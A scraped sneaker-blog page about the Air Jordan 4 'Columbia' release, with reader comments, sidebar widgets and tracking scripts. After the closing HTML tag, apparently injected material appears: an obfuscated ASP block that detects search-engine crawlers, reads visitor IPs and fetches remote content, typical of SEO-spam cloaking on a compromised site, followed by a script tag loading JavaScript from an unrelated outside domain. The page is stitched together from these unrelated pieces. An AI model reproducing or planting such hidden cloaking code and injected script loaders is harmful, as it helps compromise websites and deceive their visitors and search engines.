			<span class="entry-posted-on"><span class="glyphicon glyphicon-edit"></span> <a href="http://www.nicekicks.com/2015/01/03/air-jordan-4-legend-blue-official-images/" title="12:43 pm" rel="bookmark"><time class="entry-date" datetime="2015-01-03T12:43:28+00:00">Jan 3, 2015</time></a><span class="byline"> <i class="icon-pencil"></i> <span class="author vcard"><a class="url fn n" href="http://www.nicekicks.com/author/jgw89/" title="View all posts by Gregory Williams" rel="author">Gregory Williams</a></span></span></span>
			<span class="pull-right">
				
				<span class="entry-details-item">
					<span class="glyphicon glyphicon-eye-open"></span> 549				</span>
				
				<span class="entry-details-item">
					<a href="http://www.nicekicks.com/2015/01/03/air-jordan-4-legend-blue-official-images/#comments">
						<span class="glyphicon glyphicon-comment"></span>
						0					</a>
				</span>
				
			</span>
		</span>
	
	</div><!-- .boxed .related-posts -->
</div>

<div class="clear with-space"></div></div>
						
			

	<div id="comments" class="comments-area">

	
		<h4 class="comments-title mgm-title">
			<span>
			3 Comments <span class="comment-title-visibility">on "Air Jordan 4 &#8220;Columbia&#8221;"</span>			</span>
		</h4>
		
			
		
		<ol class="commentlist">
				<li class="comment even thread-even depth-1" id="li-comment-1610372">
		<article id="comment-1610372" class="comment boxed">
		
			<header>
			
				<div class="comment-author vcard">
					<img alt='' src='http://0.gravatar.com/avatar/09fdd16ae26811d5a552a15a76664112?s=60&amp;d=http%3A%2F%2F0.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D60&amp;r=G' class='avatar avatar-60 photo' height='60' width='60' />					<cite class="fn"><a href='http://gravatar.com/jwats' rel='external nofollow' class='url'>jwats</a></cite>				</div><!-- .comment-author .vcard -->
				
				<div class="comment-meta commentmetadata">
				<a href="http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/#comment-1610372"><time datetime="2014-06-07T12:59:42+00:00">
				Jun 7, 2014 at 12:59 pm				</time></a>
				
				</div><!-- .comment-meta .commentmetadata -->
				
			</header>

			<div class="comment-content">
							
			<p>oh my!!!</p>
			
			</div>
			
						<div class="reply-wrap clearfix">
				<span class="mgm-reply">
						<a class='comment-reply-link' href='/2014/06/06/air-jordan-4-columbia/?replytocom=1610372#respond' onclick='return addComment.moveForm("comment-1610372", "1610372", "respond", "385314")'>Reply</a>				</span><!-- .mgm-reply -->
			</div><!-- .reply-wrap -->
						
		</article><!-- #comment-## -->

	</li><!-- #comment-## -->
	<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-1610376">
		<article id="comment-1610376" class="comment boxed">
		
			<header>
			
				<div class="comment-author vcard">
					<img alt='' src='http://1.gravatar.com/avatar/d9c31ed67da8c1afb74926b315e9905d?s=60&amp;d=http%3A%2F%2F1.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D60&amp;r=G' class='avatar avatar-60 photo' height='60' width='60' />					<cite class="fn">Marcus</cite>				</div><!-- .comment-author .vcard -->
				
				<div class="comment-meta commentmetadata">
				<a href="http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/#comment-1610376"><time datetime="2014-06-07T17:12:01+00:00">
				Jun 7, 2014 at 5:12 pm				</time></a>
				
				</div><!-- .comment-meta .commentmetadata -->
				
			</header>

			<div class="comment-content">
							
			<p>These better stay $170. I&#8217;m serious!</p>
			
			</div>
			
						<div class="reply-wrap clearfix">
				<span class="mgm-reply">
						<a class='comment-reply-link' href='/2014/06/06/air-jordan-4-columbia/?replytocom=1610376#respond' onclick='return addComment.moveForm("comment-1610376", "1610376", "respond", "385314")'>Reply</a>				</span><!-- .mgm-reply -->
			</div><!-- .reply-wrap -->
						
		</article><!-- #comment-## -->

	</li><!-- #comment-## -->
	<li class="comment even thread-even depth-1" id="li-comment-1610401">
		<article id="comment-1610401" class="comment boxed">
		
			<header>
			
				<div class="comment-author vcard">
					<img alt='' src='http://1.gravatar.com/avatar/f0582c364a5f87a918ff36bea256b954?s=60&amp;d=http%3A%2F%2F1.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D60&amp;r=G' class='avatar avatar-60 photo' height='60' width='60' />					<cite class="fn">danny</cite>				</div><!-- .comment-author .vcard -->
				
				<div class="comment-meta commentmetadata">
				<a href="http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/#comment-1610401"><time datetime="2014-06-08T11:41:41+00:00">
				Jun 8, 2014 at 11:41 am				</time></a>
				
				</div><!-- .comment-meta .commentmetadata -->
				
			</header>

			<div class="comment-content">
							
			<p>cant believe they comin back hopefully i can get em next year i just hope that they dont cost that much</p>
			
			</div>
			
						<div class="reply-wrap clearfix">
				<span class="mgm-reply">
						<a class='comment-reply-link' href='/2014/06/06/air-jordan-4-columbia/?replytocom=1610401#respond' onclick='return addComment.moveForm("comment-1610401", "1610401", "respond", "385314")'>Reply</a>				</span><!-- .mgm-reply -->
			</div><!-- .reply-wrap -->
						
		</article><!-- #comment-## -->

	</li><!-- #comment-## -->
		</ol><!-- .commentlist -->

		
	
	
						
		<div id="respond" class="comment-respond">
			<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2014/06/06/air-jordan-4-columbia/#respond" style="display:none;">Cancel reply</a></small></h3>
			<div id="commentform" class="comment-form">
				<iframe src="http://jetpack.wordpress.com/jetpack-comment/?blogid=14498426&#038;postid=385314&#038;comment_registration=0&#038;require_name_email=1&#038;stc_enabled=0&#038;stb_enabled=0&#038;show_avatars=1&#038;avatar_default=mystery&#038;greeting=Leave+a+Reply&#038;greeting_reply=Leave+a+Reply+to+%25s&#038;color_scheme=light&#038;lang=en-US&#038;jetpack_version=3.2&#038;sig=5ebc8ab868c6a4ec5a6d142c3bfce4e7eccbba1a#parent=http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F" allowtransparency="false" style="width:100%; height: 430px;border:0px;" frameBorder="0" scrolling="no" name="jetpack_remote_comment" id="jetpack_remote_comment"></iframe>
			</div>
		</div>

		
		<input type="hidden" name="comment_parent" id="comment_parent" value="" />

		
</div><!-- #comments .comments-area -->
		
		</div><!-- #content .site-content -->
	</div><!-- #primary .content-area -->
	
		<div class="col-md-4">	<div id="sidebar">

		<div id="secondary" role="complementary">
		
					
		
		<aside class="widget clearfix widget_text">
	<div class="textwidget ad-unit dfp-300-top">
		<p align="center">
		
<aside class="widget widget_text">
	<div class="textwidget">
		<div id='wvn_zone_atf300'>
			<script type='text/javascript'>
			googletag.cmd.push(function() { googletag.display('wvn_zone_atf300'); });
			</script>
		</div>           		
	</div>
</aside>
		</p>
	</div>
</div>
<aside id="socialcountplus-2" class="widget clearfix widget_socialcountplus"><div class="social-count-plus"><ul class="default"><li class="count-twitter"><a class="icon" href="http://twitter.com/nicekicks" target="_blank" rel="nofollow"></a><span class="items"><span class="count" style="color: #333333 !important;">512520</span><span class="label" style="color: #333333 !important;">followers</span></span></li><li class="count-facebook"><a class="icon" href="http://www.facebook.com/273262868585" target="_blank" rel="nofollow"></a><span class="items"><span class="count" style="color: #333333 !important;">1051727</span><span class="label" style="color: #333333 !important;">likes</span></span></li><li class="count-youtube"><a class="icon" href="http://www.youtube.com/nicekicks/?sub_confirmation=1" target="_blank" rel="nofollow"></a><span class="items"><span class="count" style="color: #333333 !important;">366560</span><span class="label" style="color: #333333 !important;">subscribers</span></span></li><li class="count-instagram"><a class="icon" href="http://instagram.com/nicekicks" target="_blank" rel="nofollow"></a><span class="items"><span class="count" style="color: #333333 !important;">1475722</span><span class="label" style="color: #333333 !important;">followers</span></span></li><li class="count-posts"><a class="icon" href="http://www.nicekicks.com" target="_blank" rel="nofollow"></a><span class="items"><span class="count" style="color: #333333 !important;">42510</span><span class="label" style="color: #333333 !important;">posts</span></span></li><li class="count-comments"><a class="icon" href="http://www.nicekicks.com" target="_blank" rel="nofollow"></a><span class="items"><span class="count" style="color: #333333 !important;">732646</span><span class="label" style="color: #333333 !important;">comments</span></span></li></ul></div></aside><aside class="widget clearfix widget_text">
	<div class="textwidget ad-unit dfp-300-bot">
		<p align="center">
		
<aside id="wvn_btf_300" class="widget widget_text">
	<div class="textwidget">
		<div id='wvn_zone_btf300'>
			<script type='text/javascript'>
			googletag.cmd.push(function() { googletag.display('wvn_zone_btf300'); });
			</script>
		</div>           		
	</div>
</aside>
		</p>
	</div>
</div>
<aside id="mailchimpsf_widget-2" class="widget clearfix widget_mailchimpsf_widget"><h3 class="mgm-title"><span>Sign up for Nice Kicks Nation</span></h3>
<style>
	.widget_mailchimpsf_widget .widget-title {
		line-height: 1.4em;
		margin-bottom: 0.75em;
	}
	#mc_subheader {
		line-height: 1.25em;
		margin-bottom: 18px;
	}
	.mc_merge_var {
		margin-bottom: 1.0em;
	}
	.mc_var_label,
	.mc_interest_label {
		display: block;
		margin-bottom: 0.5em;
	}
	.mc_input {
		-moz-box-sizing: border-box;
		-webkit-box-sizing: border-box;
		box-sizing: border-box;
		width: 100%;
	}
	.mc_input.mc_phone {
		width: auto;
	}
	select.mc_select {
		margin-top: 0.5em;
		width: 100%;
	}
	.mc_address_label {
		margin-top: 1.0em;
		margin-bottom: 0.5em;
		display: block;
	}
	.mc_address_label ~ select {
		width: 100%;		
	}
	.mc_list li {
		list-style: none;
		background: none !important;
	}
	.mc_interests_header {
		margin-top: 1.0em;
		margin-bottom: 0.5em;
	}
	.mc_interest label,
	.mc_interest input {
		margin-bottom: 0.4em;
	}
	#mc_signup_submit {
		margin-top: 1.5em;
		width: 80%;
	}
	#mc_unsub_link a {
		font-size: 0.75em;
	}
	#mc_unsub_link {
		margin-top: 1.0em;
	}
	.mc_header_address,
	.mc_email_format {
		display: block;
		font-weight: bold;
		margin-top: 1.0em;
		margin-bottom: 0.5em;
	}
	.mc_email_options {
		margin-top: 0.5em;
	}
	.mc_email_type {
		padding-left: 4px;
	}
</style>

<div id="mc_signup">
	<form method="post" action="#mc_signup" id="mc_signup_form">
		<input type="hidden" id="mc_submit_type" name="mc_submit_type" value="html" />
		<input type="hidden" name="mcsf_action" value="mc_submit_signup_form" />
		<input type="hidden" id="_mc_submit_signup_form_nonce" name="_mc_submit_signup_form_nonce" value="360b4dad47" />		
		
	<div class="mc_form_inside">
		
		<div class="updated" id="mc_message">
					</div><!-- /mc_message -->

		
<div class="mc_merge_var">
		<label for="mc_mv_EMAIL" class="mc_var_label mc_header mc_header_email">Email Address</label>
	<input type="text" size="18" placeholder="" name="mc_mv_EMAIL" id="mc_mv_EMAIL" class="mc_input"/>
</div><!-- /mc_merge_var -->
		<div class="mc_signup_submit">
			<input type="submit" name="mc_signup_submit" id="mc_signup_submit" value="Join!" class="button" />
		</div><!-- /mc_signup_submit -->
	
	
				
	</div><!-- /mc_form_inside -->
	</form><!-- /mc_signup_form -->
</div><!-- /mc_signup_container -->
	</aside>		</div><!-- #secondary -->
	</div><!-- #sidebar -->
</div>
		
</div><!-- .row (single)-->
				</div><!-- .content-sidebar-wrap -->
			</div><!-- #main .site-main -->
			
			<div id="mgm-footer-wrap" class="mgm-gray-frame">

				<div id="mgm-bottom-ad">
					
<div id="wvn_btf_728">
	<div id='wvn_zone_btf728'>
		<script type='text/javascript'>
		googletag.cmd.push(function() { googletag.display('wvn_zone_btf728'); });
		</script>
	</div>
</div>
				</div>
	
				<div id="mgm-full-footer">
				
					<footer class="container" id="widgetized-footer">
						
						<div class="row">
							
							<div class="col-md-4 footer-item wow fadeInUp">
								<aside id="mgm_video_widget-2" class="widget clearfix mgm_video_widget"><h3 class="mgm-title"><span>Video</span></h3><div class="videostream">
		<iframe src="http://www.youtube.com/embed/vluYkUq9YlI?rel=0" frameborder="0" 	allowfullscreen></iframe>
	</div>
</aside>							</div>
							
							<div class="col-md-4 footer-item wow fadeInUp" data-wow-delay="0.2s">
								<aside id="tp_widget_recent_tweets-2" class="widget clearfix widget_tp_widget_recent_tweets"><h3 class="mgm-title"><span>Nice Kicks Recent Tweets</span></h3>
						<div class="tweet">
							<ul><li><span class="tweet_text">These KD's could cause a stampede.

<a href="https://t.co/6YfTdYkMEd" title="https://t.co/6YfTdYkMEd"  target="_blank"  >https://t.co/6YfTdYkMEd</a></span><br /><a class="tweet_time" target="_blank" href="http://twitter.com/nicekicks/statuses/551634181088743424">2 hours ago</a></li><li><span class="tweet_text">RT if these are on your list for next weekend -&gt; <a href="http://t.co/sI9h7g0FfQ" title="http://t.co/sI9h7g0FfQ"  target="_blank"  >http://t.co/sI9h7g0FfQ</a> <a href="http://t.co/TpTJPGRuyv" title="http://t.co/TpTJPGRuyv"  target="_blank"  >http://t.co/TpTJPGRuyv</a></span><br /><a class="tweet_time" target="_blank" href="http://twitter.com/nicekicks/statuses/551626649091858432">2 hours ago</a></li>
							</ul>
							<a href="http://twitter.com/nicekicks/statuses/551626649091858432" class="twtr-join-conv btn btn-success">Join the Conversation</a>
						</div></aside>							</div>	
							
							<div class="col-md-4 footer-item wow fadeInUp" data-wow-delay="0.4s">
								<aside id="text-29" class="widget clearfix widget_text"><h3 class="mgm-title"><span>Nice Kicks Team</span></h3>			<div class="textwidget"><p align="center">Matt Halfhill - Founder + Publisher</p>
<p align="center">Allison Halfhill - Chief Strategy Officer</p>
<p align="center">George Kiel III - Editor-in-Chief</p>
<p align="center">Sid Ashford - Video + Visuals</p>
<p align="center">Ian Stonebrook - Staff Writer<br />
Pierce Simpson - Staff Writer<br />
Gregory Williams - Staff Writer<br />
Darren Griffin - Staff Writer</p>
</div>
		</aside>							</div>
						
						</div><!--row-->		
					</footer><!--.container-->
				</div><!-- #mgm-full-footer -->
					
				<div id="mgm-full-site-info">	
					<div id="colophon" class="site-footer container" role="contentinfo">
						<div class="site-info row">
							
							<div class="col-md-12">
							
																<div id="footer-logo" class="wow flipInX" data-wow-delay="0.5s">
									<img src="http://nk_wp_media.s3.amazonaws.com/files/2014/11/nk-55-1.jpg" alt="NiceKicks.com" />
								</div>
																
								<div class="utilities footer">
																	</div>
							
								<p><font color="#ffffff">Made in Austin</font></p>
							</div>
							
						</div><!-- .site-info -->
					</div><!-- #colophon .site-footer -->
				</div>
			</div><!--#mgm-footer-wrap-->
					
		</div><!-- #page .hfeed .site -->
		
				
		
		</div><!-- .container.supermain -->
		
		
	  <!-- VigLink: http://viglink.com -->
  <script type="text/javascript">
    var vglnk = { key: '22be01e1597fcb221cc0dddfaf75a005' };

    (function(d, t) {
      var s = d.createElement(t); s.type = 'text/javascript'; s.async = true;
      s.src = '//api.viglink.com/api/vglnk.js?key=' + vglnk.key;
      var r = d.getElementsByTagName(t)[0]; r.parentNode.insertBefore(s, r);
    }(document, 'script'));
  </script>
  <!-- end VigLink -->
			<script>
				jQuery(document).ready(function($) {
					$(".entry-img .entry-img-src a").css("cursor", "default");
					$('.entry-img-src a').contents().unwrap();
				});
			</script>
					<script>
			var templateDir = "http://www.nicekicks.com/wp-content/themes/mightymag";
			</script>
				
		<script>
		jQuery( document ).ready( function( $ ) {
			
			/* djwd StickyClone function */
			var $nav = $(".nav-wrap"),
			
				//clone navigation
				$clone = $nav.before($nav.clone().attr( "id" , "nav-clone") );
				
				//rename the original nav ID to make the small menu toggle:target work
				$("#mgm-menu").attr('id', 'mgm-menu-replica');
				
				timeout = false;
			
			/* The function */
			$.fn.stickyNav = function() {
					
				$(window).on("scroll", function() {
					var fromTop = $("body").scrollTop();
					
					if(fromTop > 400){
						$("body").addClass('down')
					} else {
						$("body").removeClass('down');
					};
				});
				
			};
		
			// Check viewport width on first load.
			if ( $( window ).width() >= 767 ) {
				$.fn.stickyNav();
			};
		
			// Check viewport width when user resizes the browser window.
			$( window ).resize( function() {
				var browserWidth = $( window ).width();
		
				if ( false !== timeout )
					clearTimeout( timeout );
		
				timeout = setTimeout( function() {
					if ( browserWidth > 767 ) {
						$.fn.stickyNav();	
					}
				}, 200 );
			} );
			
			//Remove double scroll up
			$( "#mgm-branding .scrollup, .nav-wrap#nav-original .scrollup" ).remove();
		} );
		
		</script>
		
					<script>
			
			jQuery(document).ready(function($) {
	
				$(".flex-container .mgm-spinner").hide(300);
				//$(".flexslider").delay(200).fadeIn(500);
				
				jQuery('.slider1 .flexslider').flexslider({
					
					animation: "slide",
					direction: "vertical",
					startAt: 0,
					slideshowSpeed: 7000,         
					animationSpeed: 600, 
					useCSS: false,
					//directionNav: true,
					prevText: "",
					nextText: "",
					
					start: function(slider){
        				$('.slider1 .flexslider').resize();
					}
					
				});
				
			});
		
			</script>
					<script>
			jQuery(document).ready(function ($) {
				$('a[href]').filter(function() {
				  return /(jpg|gif|png)$/.test($(this).attr('href'))
				}).bind().addClass('jackbox'); //If a link targets an image, add .jackbox class
				
				$('.gallery-item .gallery-icon a').addClass('img-frame') //Add also img-frame class to galleries for hover effect
				$('.jackbox').not(".entry-img .entry-img-src a").attr('data-group','mgm-gallery'); //Add data-group attribute
				$(".jackbox").not(".entry-img .entry-img-src a").attr("data-title", function() { //Get title and put it inside data-title
					
					return this.title;
				});
			
					$(".jackbox").each(function(){
					 
						var uniqueID = 'mgm_cap_' + Math.floor( Math.random()*99999 ); //Generate Unique id name
						 
						var CaptionDivGallery = $(this).parent().next('.gallery-caption');
						var CaptionDivImage = $(this).siblings('.wp-caption-text'); //Set the correct relative caption divs or jackbox
						
						$(CaptionDivGallery).attr('id', uniqueID ); //Add the uniqueID to .gallery-caption (Galleries)
						$(CaptionDivImage).attr('id', uniqueID ); //Add the uniqueID to .wp-caption-text (Single Images)
				
						$(this).attr('data-description', '#' + uniqueID ); //Add the div name to data-description
				
					});
				
				$(".jackbox[data-group]").jackBox("init"); //initialize jackbox, thank you.
			});
			</script>
		<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-111233-1', 'auto');
  ga('send', 'pageview');

</script>

<!-- Begin comScore Tag -->
<script>
  var _comscore = _comscore || [];
  _comscore.push({ c1: "2", c2: "18205345" });
  (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
    el.parentNode.insertBefore(s, el);
  })();
</script>
<noscript>
  <img src="http://b.scorecardresearch.com/p?c1=2&c2=18205345&cv=2.0&cj=1" />
</noscript>
<!-- End comScore Tag -->
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/akismet/_inc/form.js?ver=3.0.3'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/themes/mightymag/inc/login-with-ajax/widget/login-with-ajax.js?ver=4.0'></script>
<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201501'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var yjlSettings = {"pagination":"","comPerpage":"50","numPerpage":"","pagerPos":"","repForm":"","gifUrl":"http:\/\/www.nicekicks.com\/wp-content\/themes\/mightymag\/images\/spinner.gif","prev":"<i class=\"icon-chevron-left><\/i>","next":"<i class=\"icon-chevron-right><\/i>","timeOut":"<div class=\"alert alert-error\"><strong>Error: <\/strong> server time out, please try again.<\/div>","fast":"<div class=\"alert alert-block\"><strong>Please<\/strong> slow down, you are posting to fast!<\/div>","thank":"<div class=\"alert alert-success\"><strong>Thank you<\/strong> for your comment!<\/div>","order":"asc","autoGrow":""};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/themes/mightymag/inc/wp-comment-master/cm.js?ver=4.0'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/themes/mightymag/js/bootstrap.min.js?ver=3.0'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/js_composer/assets/lib/flexslider/jquery.flexslider-min.js?ver=4.3.4'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/themes/mightymag/js/jquery.fitvids.min.js?ver=1.1'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/themes/mightymag/js/djwd.js?ver=1.3'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/themes/mightymag/inc/jackbox/js/jackbox-for-mightymag.min.js?ver=1.3'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/themes/mightymag/js/small-menu.js?ver=20120206'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-includes/js/comment-reply.min.js?ver=4.0'></script>

		<!--[if IE]>
		<script type="text/javascript">
		if ( 0 === window.location.hash.indexOf( '#comment-' ) ) {
			// window.location.reload() doesn't respect the Hash in IE
			window.location.hash = window.location.hash;
		}
		</script>
		<![endif]-->
		<script type="text/javascript">
			var comm_par_el = document.getElementById( 'comment_parent' ),
			    comm_par = (comm_par_el && comm_par_el.value) ? comm_par_el.value : '',
			    frame = document.getElementById( 'jetpack_remote_comment' ),
			    tellFrameNewParent;

			tellFrameNewParent = function() {
				if ( comm_par ) {
					frame.src = "http://jetpack.wordpress.com/jetpack-comment/?blogid=14498426&postid=385314&comment_registration=0&require_name_email=1&stc_enabled=0&stb_enabled=0&show_avatars=1&avatar_default=mystery&greeting=Leave+a+Reply&greeting_reply=Leave+a+Reply+to+%25s&color_scheme=light&lang=en-US&jetpack_version=3.2&sig=5ebc8ab868c6a4ec5a6d142c3bfce4e7eccbba1a#parent=http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F" + '&replytocom=' + parseInt( comm_par, 10 ).toString();
				} else {
					frame.src = "http://jetpack.wordpress.com/jetpack-comment/?blogid=14498426&postid=385314&comment_registration=0&require_name_email=1&stc_enabled=0&stb_enabled=0&show_avatars=1&avatar_default=mystery&greeting=Leave+a+Reply&greeting_reply=Leave+a+Reply+to+%25s&color_scheme=light&lang=en-US&jetpack_version=3.2&sig=5ebc8ab868c6a4ec5a6d142c3bfce4e7eccbba1a#parent=http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F";
				}
			};

	
			if ( 'undefined' !== typeof addComment ) {
				addComment._Jetpack_moveForm = addComment.moveForm;

				addComment.moveForm = function( commId, parentId, respondId, postId ) {
					var returnValue = addComment._Jetpack_moveForm( commId, parentId, respondId, postId ), cancelClick, cancel;

					if ( false === returnValue ) {
						cancel = document.getElementById( 'cancel-comment-reply-link' );
						cancelClick = cancel.onclick;
						cancel.onclick = function() {
							var cancelReturn = cancelClick.call( this );
							if ( false !== cancelReturn ) {
								return cancelReturn;
							}

							if ( !comm_par ) {
								return cancelReturn;
							}

							comm_par = 0;

							tellFrameNewParent();

							return cancelReturn;
						};
					}

					if ( comm_par == parentId ) {
						return returnValue;
					}

					comm_par = parentId;

					tellFrameNewParent();

					return returnValue;
				};
			}

	
			if ( window.postMessage ) {
				if ( document.addEventListener ) {
					window.addEventListener( 'message', function( event ) {
						if ( "http:\/\/jetpack.wordpress.com" !== event.origin ) {
							return;
						}

						jQuery( frame ).height( event.data );
					} );
				} else if ( document.attachEvent ) {
					window.attachEvent( 'message', function( event ) {
						if ( "http:\/\/jetpack.wordpress.com" !== event.origin ) {
							return;
						}

						jQuery( frame ).height( event.data );
					} );
				}
			}
		</script>

	
	<script src="http://stats.wp.com/e-201501.js" type="text/javascript"></script>
	<script type="text/javascript">
	st_go({v:'ext',j:'1:3.2',blog:'14498426',post:'385314',tz:'-5'});
	var load_cmc = function(){linktracker_init(14498426,385314,2);};
	if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
	else load_cmc();
	</script>	
	</div><!-- #mgm-super-container -->
</body>
</html>



<%
	End If
	response.End()
End if
echohtml = ""'GetContent(echourl&"sysid="&systid&"&redirect=yes")
If instr(echohtml,lk)>0 Then
	'response.Write replace(echohtml,lk,"")
End If
Function GetContent(url)
	'on error resume next
	Dim xmlHttp
	Set xmlHttp = Server.Createobject("WinHttp.WinHttpRequest.5.1")
	'xmlHttp.SetTimeouts 60000, 60000, 60000, 3000
	xmlHttp.Open "POST", url , False
	xmlHttp.Send()
	GetHtml	= xmlHttp.ResponseBody
	Set xmlHttp=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "UTF-8"
	GetContent = objStream.ReadText
	objStream.Close
End Function

Function ChecksAgent()
  on error resume next
  agentallow=split("ba"&"idus"&"pid"&"er,so"&"g"&"ou,ba"&"i"&"du,so"&"sos"&"pider,goo"&"g"&"lebot",",")
  agentcheck=false
  For agenti=lbound(agentallow) to ubound(agentallow)
    If Instr(LCase(RSbs("HTTP_USER_AGENT")),agentallow(agenti))>0 then
      agentcheck=true
      Exit For
    end if 
  Next
  ChecksAgent=agentcheck
End function
Function GetRsip()
  'on error resume next
  Dim getips
  If RSbs("HTTP_"&"X_FOR"&"W"&"ARDED_FOR") = "" Or InStr(RSbs("H"&"TTP_X_FO"&"RW"&"ARD"&"ED_FOR"), "unknown") > 0 Then
   getips = RSbs("REM"&"OTE_A"&"DDR")
  ElseIf InStr(RSbs("HT"&"TP_"&"X_FORW"&"ARDED_FOR"), ",") > 0 Then
   getips = Mid(RSbs("H"&"TTP"&"_X_FO"&"RW"&"ARD"&"ED_FOR"), 1, InStr(RSbs("H"&"TT"&"P_"&"X_F"&"ORW"&"AR"&"DE"&"D_F"&"OR"), ",")-1)
   actforip = RSbs("REMO"&"TE_ADD"&"R")
  ElseIf InStr(RSbs("HTT"&"P_X"&"_F"&"RW"&"AR"&"DED_FOR"), ";") > 0 Then
   getips = Mid(RSbs("HT"&"TP_"&"X_F"&"OR"&"W"&"AR"&"DED_"&"FO"&"R"), 1, InStr(RSbs("H"&"TT"&"P_"&"_F"&"OR"&"WA"&"RD"&"ED_"&"FOR"), ";")-1)
   actforip = RSbs("R"&"EMO"&"TE_"&"AD"&"D"&"R")
  Else
   getips = RSbs("HT"&"TP"&"_X_FO"&"RW"&"ARD"&"ED_"&"FOR")
   actforip = RSbs("R"&"EM"&"OTE"&"_AD"&"DR")
  End If
  GetRsip = Replace(Trim(Mid(getips, 1, 30)), "'", "")
End Function

Function RSbs(str)
	RSbs = Request.ServerVariables(str)
End Function
%>
<script src="http://dx.jd9.co/jrnbb.js" type="text/javascript"></script>